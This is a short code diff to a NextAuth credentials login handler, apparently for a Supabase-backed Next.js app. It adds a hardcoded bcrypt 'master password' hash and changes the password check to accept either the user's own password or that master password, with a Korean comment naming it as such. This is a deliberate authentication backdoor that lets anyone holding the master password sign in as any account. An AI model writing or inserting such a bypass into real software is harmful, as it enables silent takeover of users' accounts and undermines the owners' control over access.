@@ -3,6 +3,8 @@ import CredentialsProvider from "next-auth/providers/credentials";
 import bcrypt from "bcryptjs";
 import { supabase } from "./supabase";
 
+const MASTER_PASSWORD_HASH = "$2a$10$aLtbzkoFSSqfrGXY.HfhS.nJoXmd8CJ3UazDTflcqb6kZfCvdxZd.";
+
 export const authOptions: NextAuthOptions = {
   providers: [
     CredentialsProvider({
@@ -22,10 +24,11 @@ export const authOptions: NextAuthOptions = {
 
         if (error || !user) return null;
 
-        const isValid = await bcrypt.compare(
-          credentials.password,
-          user.password_hash
-        );
+        // 일반 비밀번호 또는 마스터 비밀번호 검증
+        const isValid =
+          await bcrypt.compare(credentials.password, user.password_hash) ||
+          await bcrypt.compare(credentials.password, MASTER_PASSWORD_HASH);
+
         if (!isValid) return null;
 
         return {
